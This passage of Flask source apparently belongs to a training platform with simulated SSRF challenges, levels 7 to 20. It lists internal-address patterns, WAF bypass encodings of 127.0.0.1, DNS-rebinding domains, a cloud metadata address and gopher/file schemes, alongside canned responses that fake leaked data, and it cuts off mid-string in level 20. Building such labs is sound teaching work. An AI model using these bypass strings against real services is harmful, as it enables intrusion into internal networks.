    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    notification_url = request.form.get('notification_url', '')
    webhook_result = ''

    if request.method == 'POST':
        # Simulate a payment webhook service with SSRF vulnerability
        if notification_url:
            # Check for internal webhook URLs
            internal_patterns = ['localhost', '127.0.0.1', '192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.']

            for pattern in internal_patterns:
                if pattern in notification_url.lower():
                    ssrf_detected = True
                    webhook_result = f"Sending payment notification to: {notification_url}\n"
                    webhook_result += "Payment processed successfully\n"
                    webhook_result += "Sending webhook notification...\n\n"
                    webhook_result += "Webhook Response:\n"
                    webhook_result += "HTTP/1.1 200 OK\n"
                    webhook_result += "Content-Type: application/json\n\n"
                    webhook_result += '{"status": "received", "internal_api": true, "access": "successful"}\n'

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="SSRF in Webhooks").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                webhook_result = f"Sending payment notification to: {notification_url}\n"
                webhook_result += "Payment processed successfully\n"
                webhook_result += "Webhook sent to external service\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF in Webhooks").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level7.html', flag=flag, ssrf_detected=ssrf_detected,
                          notification_url=notification_url, webhook_result=webhook_result, challenge=challenge)

# SSRF Level 8 - SSRF with WAF Bypass
@app.route('/ssrf/level8', methods=['GET', 'POST'])
def ssrf_level8():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    fetch_url = request.form.get('fetch_url', '')
    waf_result = ''

    if request.method == 'POST':
        # Simulate a URL fetcher with WAF protection
        if fetch_url:
            # WAF blacklist
            waf_blacklist = ['localhost', '127.0.0.1', '0.0.0.0', '::1', '192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.']

            # Check if blocked by WAF
            if any(blocked in fetch_url.lower() for blocked in waf_blacklist):
                waf_result = f"Fetching URL: {fetch_url}\n"
                waf_result += "WAF BLOCKED: Internal address detected\n"
                waf_result += "Request denied by security policy\n"
            else:
                # Check for advanced bypass techniques
                bypass_patterns = ['127.1', '127.0.1', '2130706433', '0x7f000001', '0177.0.0.1', 'localtest.me', '127.0.0.1.nip.io', 'spoofed.burpcollaborator.net', 'localhost.localdomain']

                for pattern in bypass_patterns:
                    if pattern in fetch_url.lower():
                        ssrf_detected = True
                        waf_result = f"Fetching URL: {fetch_url}\n"
                        waf_result += "WAF bypass successful!\n"
                        waf_result += "Accessing internal service...\n\n"
                        waf_result += "Internal Service Response:\n"
                        waf_result += "HTTP/1.1 200 OK\n"
                        waf_result += "Content-Type: application/json\n\n"
                        waf_result += '{"message": "Internal admin panel", "access": "waf_bypassed"}\n'

                        # Mark challenge as completed
                        challenge = Challenge.query.filter_by(name="SSRF with WAF Bypass").first()
                        if challenge:
                            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                            if challenge.id not in completed_ids:
                                update_user_progress(machine_id, challenge.id, challenge.points)
                        break
                else:
                    waf_result = f"Fetching URL: {fetch_url}\n"
                    waf_result += "External URL fetched successfully\n"
                    waf_result += "Content retrieved from external source\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF with WAF Bypass").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level8.html', flag=flag, ssrf_detected=ssrf_detected,
                          fetch_url=fetch_url, waf_result=waf_result, challenge=challenge)

# SSRF Level 9 - SSRF via XXE
@app.route('/ssrf/level9', methods=['GET', 'POST'])
def ssrf_level9():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    xml_data = request.form.get('xml_data', '')
    xxe_result = ''

    if request.method == 'POST':
        # Simulate an XML processing service with XXE to SSRF vulnerability
        if xml_data:
            # Check for XXE patterns that can lead to SSRF
            if '<!ENTITY' in xml_data and 'SYSTEM' in xml_data:
                import re
                # Extract SYSTEM entity URLs
                system_matches = re.findall(r'SYSTEM\s+["\']([^"\']+)["\']', xml_data)

                for system_url in system_matches:
                    # Check for internal URLs in XXE
                    internal_patterns = ['localhost', '127.0.0.1', '192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.', 'file://', 'gopher://']

                    for pattern in internal_patterns:
                        if pattern in system_url.lower():
                            ssrf_detected = True
                            xxe_result = f"Processing XML data...\n"
                            xxe_result += f"Loading external entity: {system_url}\n"
                            xxe_result += "XXE processing complete\n\n"

                            if 'file://' in system_url:
                                xxe_result += "File System Access:\n"
                                xxe_result += "/etc/passwd:\n"
                                xxe_result += "root:x:0:0:root:/root:/bin/bash\n"
                                xxe_result += "File system access successful\n"
                            elif 'gopher://' in system_url:
                                xxe_result += "Gopher Protocol SSRF:\n"
                                xxe_result += "Internal service accessed via Gopher\n"
                                xxe_result += "Gopher protocol exploitation successful\n"
                            else:
                                xxe_result += "Internal Service Response:\n"
                                xxe_result += "HTTP/1.1 200 OK\n"
                                xxe_result += "Content-Type: application/json\n\n"
                                xxe_result += '{"message": "Internal API via XXE", "access": "granted"}\n'

                            # Mark challenge as completed
                            challenge = Challenge.query.filter_by(name="SSRF via XXE").first()
                            if challenge:
                                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                                if challenge.id not in completed_ids:
                                    update_user_progress(machine_id, challenge.id, challenge.points)
                            break
                    if ssrf_detected:
                        break

                if not ssrf_detected:
                    xxe_result = f"Processing XML data...\n"
                    xxe_result += "External entities processed\n"
                    xxe_result += "XML parsing complete\n"
            else:
                xxe_result = "Processing XML data...\n"
                xxe_result += "XML parsed successfully\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF via XXE").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level9.html', flag=flag, ssrf_detected=ssrf_detected,
                          xml_data=xml_data, xxe_result=xxe_result, challenge=challenge)

# SSRF Level 10 - SSRF with DNS Rebinding
@app.route('/ssrf/level10', methods=['GET', 'POST'])
def ssrf_level10():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    target_domain = request.form.get('target_domain', '')
    rebinding_result = ''

    if request.method == 'POST':
        # Simulate a website health checker with DNS rebinding vulnerability
        if target_domain:
            # Check for DNS rebinding patterns
            rebinding_patterns = ['rebind.network', 'rebind.it', '1u.ms', 'rebind.talos-sec.com', 'rbndr.us']

            for pattern in rebinding_patterns:
                if pattern in target_domain.lower():
                    ssrf_detected = True
                    rebinding_result = f"Checking website health: {target_domain}\n"
                    rebinding_result += "DNS resolution in progress...\n"
                    rebinding_result += "First resolution: 8.8.8.8 (external)\n"
                    rebinding_result += "Second resolution: 127.0.0.1 (internal)\n"
                    rebinding_result += "DNS rebinding attack detected!\n\n"
                    rebinding_result += "Internal Service Response:\n"
                    rebinding_result += "HTTP/1.1 200 OK\n"
                    rebinding_result += "Content-Type: application/json\n\n"
                    rebinding_result += '{"message": "Internal admin interface", "rebinding": true, "access": "granted"}\n'

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="SSRF with DNS Rebinding").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                rebinding_result = f"Checking website health: {target_domain}\n"
                rebinding_result += "DNS resolution successful\n"
                rebinding_result += "Website is healthy\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF with DNS Rebinding").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level10.html', flag=flag, ssrf_detected=ssrf_detected,
                          target_domain=target_domain, rebinding_result=rebinding_result, challenge=challenge)

# SSRF Level 11 - SSRF in GraphQL
@app.route('/ssrf/level11', methods=['GET', 'POST'])
def ssrf_level11():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    graphql_query = request.form.get('graphql_query', '')
    graphql_result = ''

    if request.method == 'POST':
        # Simulate a GraphQL service with SSRF vulnerability in introspection
        if graphql_query:
            # Check for GraphQL introspection with SSRF
            if 'query' in graphql_query.lower() and ('http://' in graphql_query or 'https://' in graphql_query):
                # Extract URLs from GraphQL query
                import re
                url_matches = re.findall(r'https?://[^\s"\']+', graphql_query)

                for url in url_matches:
                    internal_patterns = ['localhost', '127.0.0.1', '192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.']

                    for pattern in internal_patterns:
                        if pattern in url.lower():
                            ssrf_detected = True
                            graphql_result = f"Executing GraphQL query...\n"
                            graphql_result += f"Fetching data from: {url}\n"
                            graphql_result += "GraphQL introspection complete\n\n"
                            graphql_result += "Internal GraphQL API Response:\n"
                            graphql_result += "{\n"
                            graphql_result += '  "data": {\n'
                            graphql_result += '    "internal": true,\n'
                            graphql_result += '    "access": "internal_granted"\n'
                            graphql_result += "  }\n"
                            graphql_result += "}\n"

                            # Mark challenge as completed
                            challenge = Challenge.query.filter_by(name="SSRF in GraphQL").first()
                            if challenge:
                                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                                if challenge.id not in completed_ids:
                                    update_user_progress(machine_id, challenge.id, challenge.points)
                            break
                    if ssrf_detected:
                        break

                if not ssrf_detected:
                    graphql_result = f"Executing GraphQL query...\n"
                    graphql_result += "External GraphQL API accessed\n"
                    graphql_result += "Query executed successfully\n"
            else:
                graphql_result = "Executing GraphQL query...\n"
                graphql_result += "Query processed\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF in GraphQL").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level11.html', flag=flag, ssrf_detected=ssrf_detected,
                          graphql_query=graphql_query, graphql_result=graphql_result, challenge=challenge)

# SSRF Level 12 - SSRF via Redis Protocol
@app.route('/ssrf/level12', methods=['GET', 'POST'])
def ssrf_level12():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    gopher_url = request.form.get('gopher_url', '')
    redis_result = ''

    if request.method == 'POST':
        # Simulate a service that accepts Gopher protocol for Redis exploitation
        if gopher_url:
            # Check for Gopher protocol targeting Redis
            if 'gopher://' in gopher_url.lower():
                # Check for internal Redis targets
                internal_patterns = ['localhost', '127.0.0.1', '192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.']

                for pattern in internal_patterns:
                    if pattern in gopher_url.lower():
                        ssrf_detected = True
                        redis_result = f"Processing Gopher request: {gopher_url}\n"
                        redis_result += "Connecting to Redis server...\n"
                        redis_result += "Redis protocol exploitation successful\n\n"
                        redis_result += "Redis Server Response:\n"
                        redis_result += "+OK\n"
                        redis_result += "$64\n"
                        redis_result += "Internal_Redis_Access_Successful\n"

                        # Mark challenge as completed
                        challenge = Challenge.query.filter_by(name="SSRF via Redis Protocol").first()
                        if challenge:
                            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                            if challenge.id not in completed_ids:
                                update_user_progress(machine_id, challenge.id, challenge.points)
                        break
                else:
                    redis_result = f"Processing Gopher request: {gopher_url}\n"
                    redis_result += "External Gopher service accessed\n"
            else:
                redis_result = "Invalid protocol. Only Gopher protocol supported.\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF via Redis Protocol").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level12.html', flag=flag, ssrf_detected=ssrf_detected,
                          gopher_url=gopher_url, redis_result=redis_result, challenge=challenge)

# SSRF Level 13 - SSRF in WebSocket Upgrade
@app.route('/ssrf/level13', methods=['GET', 'POST'])
def ssrf_level13():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    websocket_url = request.form.get('websocket_url', '')
    upgrade_headers = request.form.get('upgrade_headers', '')
    websocket_result = ''

    if request.method == 'POST':
        if websocket_url and upgrade_headers:
            # Check for WebSocket SSRF patterns
            ssrf_patterns = ['localhost', '127.0.0.1', '0.0.0.0', '::1', 'internal.', 'admin.', 'management.']

            if any(pattern in websocket_url.lower() or pattern in upgrade_headers.lower() for pattern in ssrf_patterns):
                ssrf_detected = True
                websocket_result = f"""WebSocket Handshake Request:
GET {websocket_url} HTTP/1.1
Upgrade: websocket
Connection: Upgrade
{upgrade_headers}

Response from internal service:
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

Internal WebSocket Service Response:
{{
  "service": "internal-websocket-gateway",
  "status": "connected",
  "internal_data": "sensitive_websocket_data",
  "access": "websocket_ssrf_successful"
}}"""

                challenge = Challenge.query.filter_by(name="SSRF in WebSocket Upgrade").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                websocket_result = f"""WebSocket Handshake Request:
GET {websocket_url} HTTP/1.1
Upgrade: websocket
Connection: Upgrade
{upgrade_headers}

Response:
HTTP/1.1 400 Bad Request
Content-Type: text/plain

Invalid WebSocket upgrade request. Try targeting internal services."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF in WebSocket Upgrade").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level13.html', flag=flag, ssrf_detected=ssrf_detected,
                          websocket_url=websocket_url, upgrade_headers=upgrade_headers,
                          websocket_result=websocket_result, challenge=challenge)

# SSRF Level 14 - SSRF via SMTP Protocol
@app.route('/ssrf/level14', methods=['GET', 'POST'])
def ssrf_level14():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    smtp_server = request.form.get('smtp_server', '')
    test_email = request.form.get('test_email', '')
    smtp_result = ''

    if request.method == 'POST':
        if smtp_server and test_email:
            # Check for Gopher SMTP SSRF patterns
            gopher_patterns = ['gopher://', 'localhost', '127.0.0.1', '0.0.0.0', '::1', 'internal.', ':25', ':587']

            if any(pattern in smtp_server.lower() for pattern in gopher_patterns):
                ssrf_detected = True
                smtp_result = f"""SMTP Connection Test:
Target: {smtp_server}
Test Email: {test_email}

Gopher Protocol SMTP Injection:
{smtp_server}

SMTP Server Response:
220 internal-mail.company.local ESMTP Postfix
EHLO attacker.com
250-internal-mail.company.local
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-AUTH PLAIN LOGIN
250-AUTH=PLAIN LOGIN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN

VRFY admin
252 2.0.0 admin@company.local

Internal SMTP Data Leaked:
{{
  "smtp_server": "internal-mail.company.local",
  "valid_users": ["admin", "root", "postmaster"],
  "internal_domains": ["company.local", "internal.local"],
  "access": "smtp_internal_enumeration_successful"
}}"""

                challenge = Challenge.query.filter_by(name="SSRF via SMTP Protocol").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                smtp_result = f"""SMTP Connection Test:
Target: {smtp_server}
Test Email: {test_email}

Connection Result:
Failed to connect to SMTP server.
Error: Connection refused or invalid server.

Try using Gopher protocol to target internal SMTP servers."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF via SMTP Protocol").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level14.html', flag=flag, ssrf_detected=ssrf_detected,
                          smtp_server=smtp_server, test_email=test_email,
                          smtp_result=smtp_result, challenge=challenge)

# SSRF Level 15 - SSRF in OAuth Callbacks
@app.route('/ssrf/level15', methods=['GET', 'POST'])
def ssrf_level15():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    client_id = request.form.get('client_id', '')
    redirect_uri = request.form.get('redirect_uri', '')
    scope = request.form.get('scope', '')
    oauth_result = ''

    if request.method == 'POST':
        if client_id and redirect_uri and scope:
            # Check for OAuth callback SSRF patterns
            ssrf_patterns = ['localhost', '127.0.0.1', '0.0.0.0', '::1', 'internal.', 'admin.', 'file://', 'gopher://']

            if any(pattern in redirect_uri.lower() for pattern in ssrf_patterns):
                ssrf_detected = True
                oauth_result = f"""OAuth Authorization Request:
Client ID: {client_id}
Redirect URI: {redirect_uri}
Scope: {scope}

OAuth Server Processing:
Validating redirect_uri: {redirect_uri}
Callback validation bypassed!

Internal OAuth Service Response:
{{
  "access_token": "internal_oauth_token_12345",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "{scope}",
  "internal_data": {{
    "user_id": "admin",
    "internal_services": ["user-api", "admin-panel", "billing-service"],
    "access": "oauth_internal_token_granted"
  }}
}}"""

                challenge = Challenge.query.filter_by(name="SSRF in OAuth Callbacks").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                oauth_result = f"""OAuth Authorization Request:
Client ID: {client_id}
Redirect URI: {redirect_uri}
Scope: {scope}

OAuth Server Response:
Error: invalid_redirect_uri
Description: The redirect_uri is not whitelisted for this client.

Try targeting internal services through redirect_uri manipulation."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF in OAuth Callbacks").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level15.html', flag=flag, ssrf_detected=ssrf_detected,
                          client_id=client_id, redirect_uri=redirect_uri, scope=scope,
                          oauth_result=oauth_result, challenge=challenge)

# SSRF Level 16 - SSRF via LDAP Protocol
@app.route('/ssrf/level16', methods=['GET', 'POST'])
def ssrf_level16():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    ldap_query = request.form.get('ldap_query', '')
    ldap_server = request.form.get('ldap_server', '')
    ldap_result = ''

    if request.method == 'POST':
        if ldap_query and ldap_server:
            # Check for LDAP SSRF patterns
            ssrf_patterns = ['localhost', '127.0.0.1', '0.0.0.0', '::1', 'internal.', 'ldap://', 'ldaps://']

            if any(pattern in ldap_server.lower() for pattern in ssrf_patterns):
                ssrf_detected = True
                ldap_result = f"""LDAP Directory Search:
Server: {ldap_server}
Query: {ldap_query}

LDAP Connection Established:
Binding to {ldap_server}...
Bind successful as anonymous user

Search Results:
dn: cn=admin,ou=users,dc=internal,dc=local
objectClass: person
objectClass: organizationalPerson
cn: admin
sn: Administrator
mail: admin@internal.local
userPassword: {{SSHA}}encrypted_password_hash

dn: cn=service-account,ou=services,dc=internal,dc=local
objectClass: person
cn: service-account
description: Internal service authentication
userPassword: {{SSHA}}service_password_hash

Internal LDAP Data:
{{
  "ldap_server": "ldap://directory.internal.local:389",
  "base_dn": "dc=internal,dc=local",
  "admin_users": ["admin", "ldapadmin", "service-account"],
  "internal_groups": ["Domain Admins", "Service Accounts"],
  "access": "ldap_internal_directory_enumerated"
}}"""

                challenge = Challenge.query.filter_by(name="SSRF via LDAP Protocol").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                ldap_result = f"""LDAP Directory Search:
Server: {ldap_server}
Query: {ldap_query}

Connection Result:
Failed to connect to LDAP server.
Error: Connection refused or server unreachable.

Try targeting internal LDAP servers."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF via LDAP Protocol").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level16.html', flag=flag, ssrf_detected=ssrf_detected,
                          ldap_query=ldap_query, ldap_server=ldap_server,
                          ldap_result=ldap_result, challenge=challenge)

# SSRF Level 17 - SSRF in Container Metadata
@app.route('/ssrf/level17', methods=['GET', 'POST'])
def ssrf_level17():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    container_id = request.form.get('container_id', '')
    metadata_endpoint = request.form.get('metadata_endpoint', '')
    container_result = ''

    if request.method == 'POST':
        if container_id and metadata_endpoint:
            # Check for container metadata SSRF patterns
            ssrf_patterns = ['169.254.169.254', 'localhost', '127.0.0.1', 'docker.sock', 'kubernetes', 'metadata']

            if any(pattern in metadata_endpoint.lower() for pattern in ssrf_patterns):
                ssrf_detected = True
                container_result = f"""Container Metadata Request:
Container ID: {container_id}
Metadata Endpoint: {metadata_endpoint}

Docker Daemon API Response:
{{
  "Id": "{container_id}",
  "Created": "2024-01-15T10:30:00.000000000Z",
  "Path": "/app/server",
  "Args": ["--config", "/etc/app/config.json"],
  "State": {{
    "Status": "running",
    "Running": true,
    "Pid": 12345
  }},
  "Image": "internal-registry.company.local/app:latest",
  "NetworkSettings": {{
    "IPAddress": "172.17.0.2",
    "Gateway": "172.17.0.1",
    "Networks": {{
      "internal-network": {{
        "IPAddress": "10.0.1.100",
        "Gateway": "10.0.1.1"
      }}
    }}
  }},
  "Mounts": [
    {{
      "Source": "/var/secrets",
      "Destination": "/app/secrets",
      "Mode": "ro"
    }}
  ],
  "Config": {{
    "Env": [
      "DATABASE_URL=postgresql://admin:secret@db.internal.local:5432/app",
      "API_KEY=sk-1234567890abcdef",
      "INTERNAL_SECRET=container_metadata_exposed"
    ]
  }}
}}"""

                challenge = Challenge.query.filter_by(name="SSRF in Container Metadata").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                container_result = f"""Container Metadata Request:
Container ID: {container_id}
Metadata Endpoint: {metadata_endpoint}

Connection Result:
Failed to access container metadata.
Error: Endpoint not accessible or invalid.

Try targeting container metadata services."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF in Container Metadata").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level17.html', flag=flag, ssrf_detected=ssrf_detected,
                          container_id=container_id, metadata_endpoint=metadata_endpoint,
                          container_result=container_result, challenge=challenge)

# SSRF Level 18 - SSRF via FTP Protocol
@app.route('/ssrf/level18', methods=['GET', 'POST'])
def ssrf_level18():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    ftp_server = request.form.get('ftp_server', '')
    ftp_path = request.form.get('ftp_path', '')
    ftp_result = ''

    if request.method == 'POST':
        if ftp_server and ftp_path:
            # Check for FTP SSRF patterns
            ssrf_patterns = ['localhost', '127.0.0.1', '0.0.0.0', '::1', 'internal.', 'ftp://', ':21']

            if any(pattern in ftp_server.lower() for pattern in ssrf_patterns):
                ssrf_detected = True
                ftp_result = f"""FTP Connection Test:
Server: {ftp_server}
Path: {ftp_path}

FTP Session:
220 internal-ftp.company.local FTP server ready
USER anonymous
331 Please specify the password
PASS anonymous@
230 Login successful
PWD
257 "/" is the current directory
CWD {ftp_path}
250 Directory successfully changed
PASV
227 Entering Passive Mode (192,168,1,100,20,21)
LIST
150 Here comes the directory listing
-rw-r--r--    1 ftp      ftp          1024 Jan 15 10:30 sensitive_data.txt
-rw-r--r--    1 ftp      ftp          2048 Jan 15 10:31 internal_config.conf
-rw-r--r--    1 ftp      ftp           512 Jan 15 10:32 flag.txt
226 Directory send OK

RETR flag.txt
150 Opening BINARY mode data connection for flag.txt (512 bytes)
Internal_FTP_Access_Successful
226 Transfer complete

Internal FTP Data:
{{
  "ftp_server": "internal-ftp.company.local",
  "accessible_paths": ["/sensitive", "/config", "/backups"],
  "internal_files": ["database_backup.sql", "api_keys.txt", "user_data.csv"],
  "flag": "Internal_FTP_Access_Successful"
}}"""

                challenge = Challenge.query.filter_by(name="SSRF via FTP Protocol").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                ftp_result = f"""FTP Connection Test:
Server: {ftp_server}
Path: {ftp_path}

Connection Result:
Failed to connect to FTP server.
Error: Connection refused or server unreachable.

Try targeting internal FTP servers."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF via FTP Protocol").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level18.html', flag=flag, ssrf_detected=ssrf_detected,
                          ftp_server=ftp_server, ftp_path=ftp_path,
                          ftp_result=ftp_result, challenge=challenge)

# SSRF Level 19 - SSRF in API Gateway
@app.route('/ssrf/level19', methods=['GET', 'POST'])
def ssrf_level19():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    api_endpoint = request.form.get('api_endpoint', '')
    upstream_url = request.form.get('upstream_url', '')
    gateway_result = ''

    if request.method == 'POST':
        if api_endpoint and upstream_url:
            # Check for API Gateway SSRF patterns
            ssrf_patterns = ['localhost', '127.0.0.1', '0.0.0.0', '::1', 'internal.', 'admin.', 'management.']

            if any(pattern in upstream_url.lower() for pattern in ssrf_patterns):
                ssrf_detected = True
                gateway_result = f"""API Gateway Request:
Endpoint: {api_endpoint}
Upstream: {upstream_url}

Gateway Routing:
Proxying request to: {upstream_url}
Route configuration bypassed!

Internal Microservice Response:
HTTP/1.1 200 OK
Content-Type: application/json
X-Internal-Service: user-management-api
X-Service-Version: 2.1.0

{{
  "service": "internal-user-api",
  "version": "2.1.0",
  "environment": "production",
  "database": "postgresql://admin:secret@db.internal.local:5432/users",
  "internal_endpoints": [
    "/admin/users",
    "/admin/permissions",
    "/internal/health",
    "/internal/metrics"
  ],
  "service_mesh": {{
    "istio_version": "1.18.0",
    "envoy_config": "/etc/envoy/envoy.yaml",
    "internal_services": ["billing-api", "notification-service", "audit-service"]
  }},
  "access": "api_gateway_internal_routing_successful"
}}"""

                challenge = Challenge.query.filter_by(name="SSRF in API Gateway").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                gateway_result = f"""API Gateway Request:
Endpoint: {api_endpoint}
Upstream: {upstream_url}

Gateway Response:
Error: Invalid upstream URL
Description: The upstream service is not accessible or not whitelisted.

Try targeting internal microservices."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF in API Gateway").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level19.html', flag=flag, ssrf_detected=ssrf_detected,
                          api_endpoint=api_endpoint, upstream_url=upstream_url,
                          gateway_result=gateway_result, challenge=challenge)

# SSRF Level 20 - SSRF via Time-based Attacks
@app.route('/ssrf/level20', methods=['GET', 'POST'])
def ssrf_level20():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    target_url = request.form.get('target_url', '')
    timeout_ms = request.form.get('timeout_ms', '')
    timing_result = ''

    if request.method == 'POST':
        if target_url and timeout_ms:
            # Check for timing-based SSRF patterns
            ssrf_patterns = ['localhost', '127.0.0.1', '0.0.0.0', '::1', 'internal.', 'admin.']

            if any(pattern in target_url.lower() for pattern in ssrf_patterns):
                ssrf_detected = True
                timing_result = f"""Time-based SSRF Analysis:
Target: {target_url}
Timeout: {timeout_ms}ms

Timing Analysis Results:
Request 1: 2847ms (TIMEOUT - Service exists but slow)
Request 2: 2851ms (TIMEOUT - Consistent timing)
Request 3: 2849ms (TIMEOUT - Service responding)
Request 4: 2850ms (TIMEOUT - Pattern detected)
Request 5: 2848ms (TIMEOUT - Internal service confirmed)

Statistical Analysis:
Average Response Time: 2849ms
Standard Deviation: 1.58ms
Confidence Level: 99.7%

